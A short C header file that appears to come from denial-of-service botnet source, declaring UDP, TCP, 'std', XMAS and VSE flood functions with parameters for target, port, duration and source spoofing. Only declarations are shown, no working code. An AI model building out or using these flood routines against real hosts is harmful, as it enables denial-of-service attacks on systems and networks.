#pragma once

void udp_flood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime);
void tcp_flood(unsigned char *target, int port, int timeEnd, unsigned char *flags);
void std_flood(unsigned char *target, int port, int duration);
void xmas_flood(unsigned char *target, int port, int timeEnd);
void vse_flood(unsigned char *target, int port, int timeEnd);
